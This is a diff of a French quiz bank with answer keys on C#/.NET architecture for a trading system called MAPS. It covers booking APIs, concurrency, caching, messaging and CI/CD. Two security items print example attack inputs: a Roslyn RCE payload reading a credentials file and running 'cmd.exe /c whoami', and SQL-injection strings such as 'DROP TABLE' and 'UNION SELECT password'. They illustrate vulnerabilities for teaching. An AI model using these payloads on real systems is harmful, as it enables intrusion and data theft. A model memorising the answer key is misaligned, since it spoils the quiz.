+        "`SQL Server → Redis → RabbitMQ → SophisAdapter → BookingApi`. Mais `depends_on` ne garantit que le démarrage du container, pas la disponibilité du service — ajouter des health checks wait conditions : `depends_on: sql-server: condition: service_healthy`.",
+        "Démarrer tous les services simultanément et laisser les retry Polly gérer.",
+        "Démarrer uniquement `BookingApi` — les autres services démarrent automatiquement."
       ],
-      "answer": "Wrapper l'import MSMQ dans une directive `#if NET48` + créer `IMsmqAdapter` + implémenter `RabbitMqAdapter` pour net8.0 — la CI passe sur les deux targets.",
-      "explanation": "Multi-target avec incompatibilité : MSMQ (`System.Messaging`) n'existe pas sur .NET 8/Linux. Solution : abstraction `IMessageBus` avec deux implémentations — `MsmqMessageBus` compilée uniquement pour net48 (`#if NET48`), `RabbitMqMessageBus` pour net8.0. Dans le projet : `<ItemGroup Condition=\"'$(TargetFramework)' == 'net48'\"><PackageReference Include=\"System.Messaging\" /></ItemGroup>`. Le DI container charge l'implémentation correcte selon le runtime. La CI valide les deux targets indépendamment. C'est le pattern de migration progressive décrit dans la mission."
+      "answer": "`SQL Server → Redis → RabbitMQ → SophisAdapter → BookingApi`. Mais `depends_on` ne garantit que le démarrage du container, pas la disponibilité du service — ajouter des health checks wait conditions : `depends_on: sql-server: condition: service_healthy`.",
+      "explanation": "Ordre de dépendance Docker Compose : SQL Server doit être prêt (migrations EF Core au démarrage de `BookingApi`). Redis doit être disponible (cache warming `IHostedService`). RabbitMQ doit être connecté (`RabbitMqConsumerService` démarre avec l'application). `SophisAdapter` doit répondre (health check `/health/ready` du `BookingApi` inclut Sophis). `depends_on` sans condition = le container est démarré mais SQL Server n'est peut-être pas encore prêt à accepter des connexions. Solution : `healthcheck` sur chaque service + `condition: service_healthy` dans `depends_on`. En prod Kubernetes : readiness probes jouent ce rôle."
     },
     {
-      "question": "[Ordre de dépendance] Dans le flux complet `REST API booking → IsinService → SophisAdapter → SQL Référentiel → RabbitMQ → Sophis`, quel composant est le prérequis bloquant de tous les autres ?",
+      "question": "[Refactoring + Architecture] Un `BookingService` 500 lignes gère : validation des inputs, résolution ISIN (Sophis), vérification de limites (RMS), création du trade (SQL), publication de l'événement (RabbitMQ) et logging. Refactorisez.",
       "options": [
-        "RabbitMQ — sans messaging, rien ne peut être publié.",
-        "La résolution de l'ISIN via `IsinService`/`SophisAdapter` — sans ISIN valide, le booking ne peut pas progresser dans Sophis ni dans le référentiel SQL.",
-        "SQL Server — sans base de données, le service ne démarre pas.",
-        "Azure DevOps — sans CI/CD, le service ne peut pas être déployé."
+        "Déplacer le code dans des méthodes privées du même service.",
+        "SRP : extraire `IIsinResolver`, `IRmsLimitChecker`, `ITradeRepository`, `IEventPublisher`. `BookingService` orchestre uniquement (20 lignes). DIP : toutes injectées par constructeur. Chaque classe testée indépendamment via mock.",
+        "Créer 5 contrôleurs séparés, un par responsabilité.",
+        "Utiliser des annotations AOP (PostSharp) pour externaliser la logique."
       ],
-      "answer": "La résolution de l'ISIN via `IsinService`/`SophisAdapter` — sans ISIN valide, le booking ne peut pas progresser dans Sophis ni dans le référentiel SQL.",
-      "explanation": "Ordre de dépendance fonctionnel dans le service de booking (mission explicite) : l'ISIN est la clé de voûte. Sans ISIN : impossible d'interroger le référentiel SQL (identifiant manquant), impossible de booker dans Sophis (ISIN requis par l'API Sophis), impossible de publier l'événement sur RabbitMQ (payload incomplet). C'est pourquoi la mission mentionne séparément 'mise en place d'un service de récupération d'ISIN nécessaire pour le booking' — ce service est le prérequis critique de tout le flux."
+      "answer": "SRP : extraire `IIsinResolver`, `IRmsLimitChecker`, `ITradeRepository`, `IEventPublisher`. `BookingService` orchestre uniquement (20 lignes). DIP : toutes injectées par constructeur. Chaque classe testée indépendamment via mock.",
+      "explanation": "SRP + DIP sur `BookingService` : avant = 5 responsabilités = 5 raisons de changer = fragile. Après : `BookingService.BookAsync` → `await _isinResolver.ResolveAsync(request.InstrumentId, ct)` → `await _rmsChecker.CheckLimitsAsync(isin, request.Notional, ct)` → `await _tradeRepo.CreateAsync(trade, ct)` → `await _eventPublisher.PublishAsync(\"trade.booked\", event, ct)`. Chaque service est testable isolément avec `Mock<IIsinResolver>` etc. Si Sophis change d'API, seul `SophisIsinResolver : IIsinResolver` est modifié — `BookingService` inchangé. La mission 'refactoring du code' vise exactement cet objectif."
     },
     {
-      "question": "[Refactoring] Un `PricingController` de 800 lignes gère la validation des inputs, le pricing Black-Scholes, l'accès SQL, la publication RabbitMQ et le logging. Comment refactoriser en respectant SOLID ?",
+      "question": "[Thème ↔ Concept] Comment le principe `async/await` avec `CancellationToken` améliore-t-il la scalabilité de l'API MAPS sous charge (500 req/sec simultanées) ?",
       "options": [
-        "Diviser en 2 controllers de 400 lignes chacun.",
-        "SRP : extraire `IPricingService` (calcul), `IMarketDataRepository` (SQL), `IEventPublisher` (RabbitMQ), `IPricingValidator` (validation). Le Controller devient orchestrateur léger de 20 lignes. DIP : toutes les dépendances injectées par constructeur.",
-        "Déplacer toute la logique dans les méthodes privées du Controller.",
-        "Utiliser des annotations `[PricingFilter]` pour externaliser la logique."
+        "Il utilise plusieurs threads simultanément pour traiter les requêtes.",
+        "`async/await` libère le thread HTTP pendant l'I/O (appels Sophis 150ms, SQL 5ms, Redis 2ms). Kestrel peut servir des milliers de requêtes concurrentes avec quelques dizaines de threads — le thread n'est occupé que pendant le calcul CPU, pas l'attente.",
+        "Il double la quantité de RAM disponible pour l'API.",
+        "Il permet à plusieurs requêtes de partager le même thread CPU."
       ],
-      "answer": "SRP : extraire `IPricingService` (calcul), `IMarketDataRepository` (SQL), `IEventPublisher` (RabbitMQ), `IPricingValidator` (validation). Le Controller devient orchestrateur léger de 20 lignes. DIP : toutes les dépendances injectées par constructeur.",
-      "explanation": "SRP sur le Controller : un Controller 800 lignes = 5+ responsabilités = 5+ raisons de changer = fragilité. Après refactoring : `PricingController` reçoit `IPricingService, IEventPublisher, IPricingValidator` par injection, appelle les méthodes, retourne le résultat HTTP. `PricingService` contient uniquement le calcul (Black-Scholes, Greeks). `MarketDataRepository` = SQL uniquement. `EventPublisher` = RabbitMQ uniquement. Chaque classe a une seule raison de changer. Tests unitaires : mocker chaque interface séparément. La mission 'refactoring du code' décrit exactement ce type d'intervention."
-    },
-    {
-      "question": "[Anti-pattern + Sécurité] Une API REST de pricing accepte `{\"model\": \"BlackScholes\", \"codeToEvaluate\": \"S * 1.1\"}` et l'évalue dynamiquement avec `Roslyn CSharpScript.EvaluateAsync(request.codeToEvaluate)`. Quel risque critique ?",
-      "options": [
-        "Aucun risque — Roslyn est sécurisé.",
-        "Remote Code Execution (RCE) — un attaquant peut envoyer du code arbitraire exécuté sur le serveur : accès au système de fichiers, exécution de processus, exfiltration de données de marché confidentielles.",
-        "Le seul risque est une dégradation des performances.",
-        "Roslyn ne supporte pas l'exécution de code avec des inputs externes."
-      ],
-      "answer": "Remote Code Execution (RCE) — un attaquant peut envoyer du code arbitraire exécuté sur le serveur : accès au système de fichiers, exécution de processus, exfiltration de données de marché confidentielles.",
-      "explanation": "RCE critique en CIB : `CSharpScript.EvaluateAsync(userInput)` exécute littéralement n'importe quel code C# sur le serveur. Payload malveillant : `System.IO.File.ReadAllText(\"/app/config/sophis-credentials.json\")` ou `System.Diagnostics.Process.Start(\"cmd.exe\", \"/c whoami\")`. Dans un environnement bancaire : accès aux credentials Sophis, aux données de position, aux clés API. Correction : whitelist des modèles autorisés (`if(model not in [\"BlackScholes\", \"Heston\"]) return BadRequest()`), paramétrage des inputs (strike, vol, etc.), jamais d'évaluation dynamique de code externe."
-    },
-    {
-      "question": "[Thème ↔ Outil] Quel outil mesure précisément les gains de performance du refactoring du service de référentiel de données en C# ?",
-      "options": [
-        "xUnit avec des tests unitaires classiques.",
-        "BenchmarkDotNet — compare les implémentations (séquentielle vs parallèle, avec/sans cache, avant/après refactoring) avec des métriques précises : moyenne, percentiles, allocations GC.",
-        "Azure DevOps Pipeline — les logs de build montrent les gains de performance.",
-        "Visual Studio Profiler uniquement en mode Release."
-      ],
-      "answer": "BenchmarkDotNet — compare les implémentations (séquentielle vs parallèle, avec/sans cache, avant/après refactoring) avec des métriques précises : moyenne, percentiles, allocations GC.",
-      "explanation": "BenchmarkDotNet est le standard .NET pour les benchmarks de performance. `[Benchmark] public void PriceBook_Before()` vs `[Benchmark] public void PriceBook_After()` → résultats : Mean time, StdDev, Gen0/Gen1/Gen2 (GC pressure), Allocated. La mission mentionne 'optimisation des performances' + 'multithreading' + 'gestion de la mémoire' — mesurer les gains avant/après est indispensable pour valider les optimisations. Exemple concret : `ArrayPool<T>` réduit Gen0 de 500MB à 0 pour une simulation Monte Carlo."
+      "answer": "`async/await` libère le thread HTTP pendant l'I/O (appels Sophis 150ms, SQL 5ms, Redis 2ms). Kestrel peut servir des milliers de requêtes concurrentes avec quelques dizaines de threads — le thread n'est occupé que pendant le calcul CPU, pas l'attente.",
+      "explanation": "Modèle de concurrence ASP.NET Core : sans `async`, chaque requête monopolise un thread pendant toute sa durée (y compris l'attente I/O). 500 req/sec × 150ms Sophis = 75 threads bloqués en permanence. Avec `async/await` : le thread retourne au pool pendant `await _sophisAdapter.GetISINAsync()`. Kestrel reassigne ce thread à d'autres requêtes. En régime, 16 threads CPU peuvent gérer des milliers de connexions I/O-bound concurrentes. `CancellationToken` complète : si le client ferme sa connexion pendant l'attente Sophis, l'appel est annulé immédiatement — libération des ressources."
     }
   ],
   expert: [
     {
-      "question": "[Situation → Multi-concepts] Un Autocall 3 ans sur le CAC40 (barrière autocall 100%, protection 60%, coupon 8%/an) doit être pricé et ses Greeks calculés dans MAPS. Identifiez le moteur de pricing, les défis techniques et l'architecture C# optimale.",
+      "question": "[Architecture complète] Concevez le pipeline complet d'un `POST /api/v1/booking` dans MAPS depuis le réseau jusqu'à la réponse HTTP, en identifiant chaque composant et son rôle.",
       "options": [
-        "Black-Scholes analytique + calcul séquentiel + SQL direct.",
-        "Monte Carlo C# (`Parallel.For` + `ArrayPool`) sous modèle Heston (skew/smile), Greeks par différences finies parallèles (`Task.WhenAll`), surface implicite immutable depuis Redis, publication `PricingCompleted` sur RabbitMQ — latence < 200ms.",
-        "Formule fermée Black-Scholes + `Thread.Sleep(0)` pour libérer le CPU.",
-        "DataSynapse uniquement, sans calcul local."
+        "Client → SQL Server → Sophis → RabbitMQ → Client",
+        "Client HTTPS → YARP/API Gateway (JWT + rate limit) → `BookingController` ([Authorize][ApiController]) → FluentValidation → `BookingService` → `IIsinResolver` (Redis L1/L2→Sophis) → `IRmsChecker` (limites) → `ITradeRepository` (EF Core + SQL transaction) → `IEventPublisher` (RabbitMQ `trade.booked`) → Structured log (Serilog+correlation) → 201 Created + `Location` header.",
+        "Client → Nginx → IIS → .NET 4.8 → SQL → Email confirmation",
+        "Client → Docker → Kubernetes → Azure → SQL Server → Response"
       ],
-      "answer": "Monte Carlo C# (`Parallel.For` + `ArrayPool`) sous modèle Heston (skew/smile), Greeks par différences finies parallèles (`Task.WhenAll`), surface implicite immutable depuis Redis, publication `PricingCompleted` sur RabbitMQ — latence < 200ms.",
-      "explanation": "Architecture complète pour un Autocall : (1) Heston obligatoire (Autocall très sensible au skew/terme structure de vol). (2) Monte Carlo (pas de formule fermée pour les autocalls). (3) `Parallel.For(0, N, i => { path = GeneratePath(); payoffs[i] = ComputePayoff(path); })` + `ArrayPool<double>` pour éviter les allocations. (4) Greeks par bump-and-reprice : ±1% spot pour Delta, ±1bp vol pour Vega, -1 jour pour Theta — `Task.WhenAll` pour les 5 Greeks simultanément. (5) VolSurface Heston depuis Redis (immutable, thread-safe). (6) Résultat publié sur RabbitMQ pour le blotter."
+      "answer": "Client HTTPS → YARP/API Gateway (JWT + rate limit) → `BookingController` ([Authorize][ApiController]) → FluentValidation → `BookingService` → `IIsinResolver` (Redis L1/L2→Sophis) → `IRmsChecker` (limites) → `ITradeRepository` (EF Core + SQL transaction) → `IEventPublisher` (RabbitMQ `trade.booked`) → Structured log (Serilog+correlation) → 201 Created + `Location` header.",
+      "explanation": "Flux complet du booking MAPS : (1) YARP valide le JWT et applique le rate limiter avant même que la requête atteigne le service. (2) `[ApiController]` valide le body JSON automatiquement. (3) FluentValidation vérifie les règles métier (Strike > 0, ISIN format). (4) Cache multi-niveaux résout l'ISIN en < 1ms (95%+ hit). (5) EF Core + transaction SQL garantit l'atomicité booking+audit. (6) RabbitMQ découple le booking de ses downstream (blotter, RMS). (7) Serilog enrichit avec `{TradeId}`, `{UserId}`, `{ISIN}` — MiFID II. (8) 201 Created + `Location: /api/v1/booking/{tradeId}` — REST correct."
     },
     {
-      "question": "[Architecture + .NET] Comment concevoir le service `IPricingEngine` pour supporter Black-Scholes (.NET 8), Heston (DataSynapse/net48), et un futur modèle stochastique local, sans modifier les couches supérieures ?",
+      "question": "[Nommage inversé] Un pattern garantit qu'une `VolatilitySurface` partiellement recalibrée n'est jamais observée par les threads de pricing parallèles, sans aucun verrou, avec un impact mémoire minimal.",
       "options": [
-        "Un `switch(modelName)` dans le controller.",
-        "Strategy pattern : `IPricingModel` injectée + factory `IPricingModelFactory.Create(modelName)`. `BlackScholesModel` (.NET 8), `HestonDataSynapseModel` (netstandard2.0, compatible net48/net8), nouveau modèle = nouvelle classe. OCP total.",
-        "Un seul service fat avec `if/else if` pour chaque modèle.",
-        "Dupliquer le `PricingEngine` pour chaque modèle."
+        "Double-checked locking avec `lock` sur la référence de surface",
+        "Immutable Object + swap atomique `Interlocked.Exchange(ref _surface, newSurface)` — la nouvelle surface est construite entièrement en privé, swappée atomiquement. Les threads actifs gardent leur référence locale cohérente jusqu'à leur prochain appel.",
+        "ReadWriteLockSlim avec upgrade lock pour la recalibration",
+        "Copy-on-write : chaque thread travaille sur une copie de la surface"
       ],
-      "answer": "Strategy pattern : `IPricingModel` injectée + factory `IPricingModelFactory.Create(modelName)`. `BlackScholesModel` (.NET 8), `HestonDataSynapseModel` (netstandard2.0, compatible net48/net8), nouveau modèle = nouvelle classe. OCP total.",
-      "explanation": "Design évolutif du moteur de pricing : `interface IPricingModel { Task<decimal> PriceAsync(BaseOption option, MarketData md); Task<Greeks> ComputeGreeksAsync(BaseOption option, MarketData md); }`. Factory enregistrée dans DI : `services.AddKeyedSingleton<IPricingModel, BlackScholesModel>(\"BlackScholes\")`. Pour DataSynapse (net48) : `HestonDataSynapseModel : IPricingModel` compilé en netstandard2.0, soumit les jobs via l'API DataSynapse. OCP : un nouveau modèle SABR = créer `SABRModel : IPricingModel` + enregistrer dans DI. Zéro modification du `PricingEngine` ou du Controller. C'est exactement l'objectif du 'refactoring du code' dans la mission."
+      "answer": "Immutable Object + swap atomique `Interlocked.Exchange(ref _surface, newSurface)` — la nouvelle surface est construite entièrement en privé, swappée atomiquement. Les threads actifs gardent leur référence locale cohérente jusqu'à leur prochain appel.",
+      "explanation": "Pattern fondamental pour les données partagées read-heavy en CIB : `private volatile VolatilitySurface _currentSurface`. Recalibration : `var newSurface = BuildSurface(calibratedGrid)` — objet complet et cohérent construit privément. `var old = Interlocked.Exchange(ref _currentSurface, newSurface)` — swap atomique, < 1ns. Threads pricing : `var surface = _currentSurface` — capturent la référence atomiquement. Si la recalibration s'effectue pendant un calcul, le thread garde la surface cohérente qu'il a capturée. Aucun lock = aucune contention = scalabilité parfaite. `volatile` garantit la visibilité cross-thread de la référence. Vs `ReaderWriterLockSlim` : performances identiques en read, mais zéro lock acquire/release overhead."
     },
     {
-      "question": "[Nommage inversé] Un concept garantit qu'une `VolatilitySurface` partiellement recalibrée (état intermédiaire incohérent) n'est jamais visible par les threads de pricing parallèles, sans aucun verrou. Quel est ce concept ?",
+      "question": "[Multi-concepts + Infrastructure] Décrivez l'infrastructure complète de MAPS pour supporter 1000 req/sec de pricing avec 99.9% de disponibilité, en nommant chaque composant et son rôle.",
       "options": [
-        "Pessimistic locking avec `ReaderWriterLockSlim`",
-        "Immutable Object pattern + swap atomique (`Interlocked.Exchange`) — la surface en cours de recalibration est une nouvelle instance privée, swappée atomiquement quand elle est prête. Les threads de pricing lisent toujours une instance complète cohérente.",
-        "Double-checked locking sur la référence de la surface",
-        "Eventual consistency — les threads acceptent des données légèrement périmées"
+        "Un seul serveur Windows IIS avec SQL Server local.",
+        "Kubernetes (2→20 pods HPA) + YARP API Gateway (JWT, rate limit, load balancing) + Redis Cluster (cache ISIN + rate limit) + SQL Server primary/replica (booking writes / reads) + RabbitMQ Cluster (messaging + DLQ) + Prometheus/Grafana (métriques/alertes) + Azure DevOps (CI/CD) + Docker (containerisation) + `Channel<T>` bounded (backpressure interne).",
+        "Azure Functions + CosmosDB + Service Bus + Application Insights.",
+        "3 VM Windows IIS + SQL Server AlwaysOn + MSMQ."
       ],
-      "answer": "Immutable Object pattern + swap atomique (`Interlocked.Exchange`) — la surface en cours de recalibration est une nouvelle instance privée, swappée atomiquement quand elle est prête. Les threads de pricing lisent toujours une instance complète cohérente.",
-      "explanation": "Pattern Immutable Object + atomic swap : `private volatile VolatilitySurface _currentSurface;`. Lors de la recalibration : `var newSurface = new VolatilitySurface(calibratedGrid)` (construction privée, complète). `Interlocked.Exchange(ref _currentSurface, newSurface)` — swap atomique. Tous les threads de pricing qui ont capturé une référence à l'ancienne surface continuent de l'utiliser jusqu'à leur prochain appel (cohérence garantie sur leur calcul). Aucun lock = zéro contention = scalabilité parfaite pour N threads parallèles. C'est le pattern fondamental pour les données partagées read-heavy en CIB."
+      "answer": "Kubernetes (2→20 pods HPA) + YARP API Gateway (JWT, rate limit, load balancing) + Redis Cluster (cache ISIN + rate limit) + SQL Server primary/replica (booking writes / reads) + RabbitMQ Cluster (messaging + DLQ) + Prometheus/Grafana (métriques/alertes) + Azure DevOps (CI/CD) + Docker (containerisation) + `Channel<T>` bounded (backpressure interne).",
+      "explanation": "Architecture HA pour MAPS : Kubernetes HPA = scale sur métriques Prometheus (latence P99 > 200ms → ajouter pods). YARP = point d'entrée unique, valide JWT une fois pour tous les microservices. Redis Cluster = consistent hashing sur 3 nœuds, réplication cross-AZ, cache ISIN + compteurs rate limit distribués. SQL primary/replica = écriture sur primary (booking EF Core), lecture sur replica (queries référentiel Dapper). RabbitMQ Cluster = 3 nœuds, quorum queues (pas de perte de message), DLQ pour les rejets. Channel<T> bounded = backpressure interne par pod, absorbe les microburst. 99.9% SLA = max 8h45 downtime/an — chaque composant a un failover."
     },
     {
-      "question": "[Anti-pattern + Performance] Un service C# alloue `new decimal[252]` à chaque itération de `Parallel.For(0, 100000, i => { var path = new decimal[252]; ... })` pour simuler 100k chemins Monte Carlo. Impact et correction.",
+      "question": "[Erreur + Architecture] L'API MAPS expose `GET /api/v1/instruments?sql=SELECT * FROM Instruments WHERE {userInput}` et exécute dynamiquement la requête SQL. Diagnostiquez toutes les vulnérabilités et proposez l'architecture correcte.",
       "options": [
-        "Aucun impact — le GC est efficace en .NET 8.",
-        "100k allocations × 252 × 16 bytes = ~400MB sur le heap à chaque pricing → GC Gen2 fréquents → pauses GC de 50-200ms → latence non déterministe inacceptable en CIB. Correction : `ArrayPool<decimal>.Shared.Rent(252)` + `Return()` après chaque chemin.",
-        "La correction est d'utiliser `List<decimal>` à la place de tableaux.",
-        "Seul le mode `GCSettings.LatencyMode.Batch` résout ce problème."
+        "Acceptable si le compte SQL est en read-only.",
+        "SQL Injection totale (même en read-only : `; DROP TABLE Instruments --`, exfiltration de tables non autorisées) + pas de pagination (résultat non borné) + pas d'autorisation par données + logging du SQL dans les access logs (fuite). Correction : paramètres typés `?underlyingId=BNPP&type=Call&maturityFrom=...` + LINQ/Dapper paramétré + pagination obligatoire + Specification pattern.",
+        "Le seul risque est une dégradation des performances avec des requêtes complexes.",
+        "Ajouter `[Authorize]` sur l'endpoint suffit à prévenir l'injection SQL."
       ],
-      "answer": "100k allocations × 252 × 16 bytes = ~400MB sur le heap à chaque pricing → GC Gen2 fréquents → pauses GC de 50-200ms → latence non déterministe inacceptable en CIB. Correction : `ArrayPool<decimal>.Shared.Rent(252)` + `Return()` après chaque chemin.",
-      "explanation": "Calcul : 100k × 252 × 16 bytes = ~403MB alloués et abandonnés à chaque pricing. Sur un serveur CIB qui price toutes les 30 secondes : cycles GC Gen2 continus. `GC.Collect()` peut prendre 50-200ms → latence de pricing non déterministe → le trader attend. Correction : `ArrayPool<decimal>.Shared` maintient un pool de tableaux pré-alloués. `Rent(252)` retourne un tableau du pool (O(1), no allocation). `Return(buffer)` le remet dans le pool. BenchmarkDotNet avant/après : Gen0 passe de ~400MB à 0. En production : `GCSettings.LatencyMode = GCLatencyMode.LowLatency` pendant les fenêtres de marché critiques comme filet de sécurité."
+      "answer": "SQL Injection totale (même en read-only : `; DROP TABLE Instruments --`, exfiltration de tables non autorisées) + pas de pagination (résultat non borné) + pas d'autorisation par données + logging du SQL dans les access logs (fuite). Correction : paramètres typés `?underlyingId=BNPP&type=Call&maturityFrom=...` + LINQ/Dapper paramétré + pagination obligatoire + Specification pattern.",
+      "explanation": "Vulnérabilités cumulées : (1) SQL injection : même en read-only, `UNION SELECT password FROM Users` exfiltre d'autres tables. Exécution multi-statements si MARS activé. (2) `SELECT *` sans pagination : `SELECT * FROM Instruments` = 500k lignes, OutOfMemoryException. (3) Autorisation par données : un trader equity peut voir les instruments du desk taux. (4) Log pollution : le SQL brut apparaît dans les access logs → fuite de la structure de la base. Architecture correcte : `IInstrumentQuerySpec { UnderlyingId, InstrumentType, MaturityRange, Page, PageSize }` → LINQ IQueryable → Dapper paramétré. Jamais d'input utilisateur dans une chaîne SQL."
     },
     {
-      "question": "[Thème ↔ Architecture] Comment architecturer la migration de MSMQ vers RabbitMQ dans MAPS sans interruption de service et sans modifier les services consommateurs existants ?",
+      "question": "[Ordre de dépendance + Mission] Pour la mission 'mise en place d'un nouveau service de booking via REST API', quel est l'ordre de développement optimal garantissant qualité et conformité réglementaire ?",
       "options": [
-        "Arrêter MSMQ, déployer RabbitMQ, redémarrer tous les services.",
-        "Pattern Strangler : abstraction `IMessageBus` devant MSMQ existant → implémenter `RabbitMqMessageBus : IMessageBus` → dual-write (MSMQ + RabbitMQ en parallèle) → migrer les consumers un par un → retirer MSMQ quand tous les consumers sont migrés.",
-        "Dupliquer tous les services en version RabbitMQ et déployer en blue-green.",
-        "Créer un bridge MSMQ↔RabbitMQ et garder les deux en production définitivement."
+        "Code → Tests → Documentation → Déploiement",
+        "1. Contrat OpenAPI (Swagger) → 2. Tests unitaires (interfaces mockées, TDD) → 3. Logique métier + interfaces → 4. Implémentations (Sophis, SQL, RabbitMQ) → 5. Tests d'intégration (Testcontainers) → 6. Sécurité JWT + policies + validation → 7. Structured logging MiFID II → 8. Health checks + métriques Prometheus → 9. Dockerfile multi-stage → 10. Pipeline Azure DevOps → 11. UAT + smoke tests.",
+        "1. Base de données → 2. API → 3. Tests → 4. Sécurité → 5. Docker",
+        "1. Docker → 2. Kubernetes → 3. CI/CD → 4. Code → 5. Tests"
       ],
-      "answer": "Pattern Strangler : abstraction `IMessageBus` devant MSMQ existant → implémenter `RabbitMqMessageBus : IMessageBus` → dual-write (MSMQ + RabbitMQ en parallèle) → migrer les consumers un par un → retirer MSMQ quand tous les consumers sont migrés.",
-      "explanation": "Migration sans interruption (objectif mission) : (1) Introduire `IMessageBus` (DIP) devant MSMQ — les consumers ne changent pas, ils dépendent de l'abstraction. (2) Implémenter `RabbitMqMessageBus`. (3) Dual-write : un `DualMessageBus` publie sur MSMQ ET RabbitMQ — validation en production parallèle. (4) Migrer les consumers un par un vers RabbitMQ consumer group. (5) Monitoring : vérifier que tous les messages RabbitMQ sont consommés. (6) Désactiver MSMQ. Rollback à chaque étape : basculer `DualMessageBus` vers MSMQ only. Cette approche incremental est le Strangler Fig appliqué au messaging."
+      "answer": "1. Contrat OpenAPI (Swagger) → 2. Tests unitaires (interfaces mockées, TDD) → 3. Logique métier + interfaces → 4. Implémentations (Sophis, SQL, RabbitMQ) → 5. Tests d'intégration (Testcontainers) → 6. Sécurité JWT + policies + validation → 7. Structured logging MiFID II → 8. Health checks + métriques Prometheus → 9. Dockerfile multi-stage → 10. Pipeline Azure DevOps → 11. UAT + smoke tests.",
+      "explanation": "Ordre optimal pour la mission MAPS : Contrat OpenAPI first = l'OMS peut développer le client en parallèle contre le contrat. TDD = les tests définissent le comportement attendu avant le code → les interfaces émergent naturellement. Implémentations après les interfaces = Sophis/SQL/RabbitMQ sont interchangeables. Sécurité avant les tests d'intégration = pas de régression de sécurité possible. Logging MiFID II avant mise en production = non-négociable réglementairement. Health checks avant Docker = le container sait quand il est prêt. CI/CD en dernier = automatisation d'un processus déjà validé. Sans cet ordre : la sécurité est souvent ajoutée en dernier (risque), les logs MiFID II manquent au premier déploiement."
     },
     {
-      "question": "[Ordre de dépendance + Architecture] Pour implémenter le nouveau service REST API de booking (mention explicite de la mission), dans quel ordre les composants doivent-ils être développés et testés ?",
+      "question": "[Nommage inversé + .NET] Un mécanisme .NET permet d'allouer un tableau sur la stack au lieu du heap, limitant son impact au GC, utilisable uniquement pour de petits arrays de taille connue au compile time. Quel est-il ?",
       "options": [
-        "L'ordre n'a pas d'importance en développement agile.",
-        "1. Contrat OpenAPI/Swagger → 2. `IBookingService` + tests unitaires (mock Sophis) → 3. `IIsinService` + cache → 4. Validation `BookingRequest` (FluentValidation) → 5. Sécurité JWT + autorisation → 6. Intégration Sophis → 7. Publication RabbitMQ → 8. Tests d'intégration → 9. Pipeline Azure DevOps.",
-        "1. Base de données → 2. Sophis → 3. RabbitMQ → 4. API → 5. Tests.",
-        "1. Interface Angular → 2. API → 3. Tests → 4. Sophis."
+        "`ArrayPool<T>.Shared.Rent(n)` — pool partagé",
+        "`stackalloc T[n]` retourné dans un `Span<T>` — allocation stack sans aucune pression GC, libéré à la sortie de scope. Limité aux types non-managés et aux petites tailles (stack ~1MB).",
+        "`new T[n]` avec `GC.SuppressFinalize` pour éviter la collection",
+        "`Memory<T>` sur le heap managé sans GC pressure"
       ],
-      "answer": "1. Contrat OpenAPI/Swagger → 2. `IBookingService` + tests unitaires (mock Sophis) → 3. `IIsinService` + cache → 4. Validation `BookingRequest` (FluentValidation) → 5. Sécurité JWT + autorisation → 6. Intégration Sophis → 7. Publication RabbitMQ → 8. Tests d'intégration → 9. Pipeline Azure DevOps.",
-      "explanation": "Ordre de dépendance pour le service de booking (mission MAPS) : contrat OpenAPI first = l'OMS et le blotter peuvent développer en parallèle contre le contrat. Tests unitaires avec mocks avant l'intégration Sophis = développement découplé de la disponibilité de Sophis. IsinService + cache avant l'intégration Sophis complète = layer de résilience. Validation avant la logique métier = fail-fast. JWT/AuthZ avant mise en production = sécurité non négociable. Sophis (step 6) et RabbitMQ (step 7) sont les intégrations à risque — développées après que la logique métier soit prouvée. CI/CD en dernier = automatisation d'un processus déjà validé."
+      "answer": "`stackalloc T[n]` retourné dans un `Span<T>` — allocation stack sans aucune pression GC, libéré à la sortie de scope. Limité aux types non-managés et aux petites tailles (stack ~1MB).",
+      "explanation": "Dans MAPS pour les micro-calculs : `Span<double> path = stackalloc double[252]` — 252 doubles = 2016 bytes sur la stack, libérés à la fermeture du scope (fin de la méthode). Zéro allocation heap, zéro GC. Limites : types non-managés uniquement (`double`, `decimal`, `int`, structs sans références). Taille fixe connue au compile time. Stack limitée (~1MB) — ne pas dépasser quelques KB. Usage dans MAPS : parsing d'ISIN (`Span<char> isinSpan = stackalloc char[12]`), calculs de Greeks locaux. Pour les grands tableaux (100k doubles Monte Carlo) : `ArrayPool`. Pour les tableaux moyens (252 doubles par chemin) dans une méthode courte : `stackalloc`."
     },
     {
-      "question": "[Multi-concepts + CIB] Un trade Autocall est booké dans Sophis via le REST API MAPS. Identifiez les 6 composants techniques traversés et leur rôle, dans l'ordre du flux.",
+      "question": "[Situation → Multi-concepts] Le pipeline CI/CD Azure DevOps de MAPS doit gérer deux branches : `feature/booking-rest-api` (développement) et `release/v2` (production). Décrivez les différences de pipeline et les gates.",
       "options": [
-        "Excel → VBA → Access → SFTP → SQL → Email",
-        "1. REST API C# (validation JWT + inputs) → 2. IIsinService (résolution ISIN + cache Redis) → 3. IPricingService (Monte Carlo Heston, Greeks) → 4. ISophisAdapter (booking dans le référentiel) → 5. SQL Server (persistance audit trail MiFID II) → 6. RabbitMQ (événement `TradeBooked` → blotter, RMS, PMS).",
-        "FIX Protocol → Broker → Exchange → Clearing → Settlement → Reporting",
-        "Angular → ASP.NET → Redis → DataSynapse → Kafka → PostgreSQL"
+        "Les deux branches utilisent le même pipeline identique.",
+        "Feature branch : build + tests unitaires + code coverage > 80% + SonarQube. Release branch : feature pipeline + tests d'intégration (Testcontainers) + docker build/push → ACR + déploiement UAT + smoke tests + gate approbation manuelle (Risk IT + Compliance) + déploiement prod + rollback automatique si health check échoue.",
+        "Feature branch : déploiement direct en production. Release : tests uniquement.",
+        "Un seul pipeline sans distinction de branches est suffisant."
       ],
-      "answer": "1. REST API C# (validation JWT + inputs) → 2. IIsinService (résolution ISIN + cache Redis) → 3. IPricingService (Monte Carlo Heston, Greeks) → 4. ISophisAdapter (booking dans le référentiel) → 5. SQL Server (persistance audit trail MiFID II) → 6. RabbitMQ (événement `TradeBooked` → blotter, RMS, PMS).",
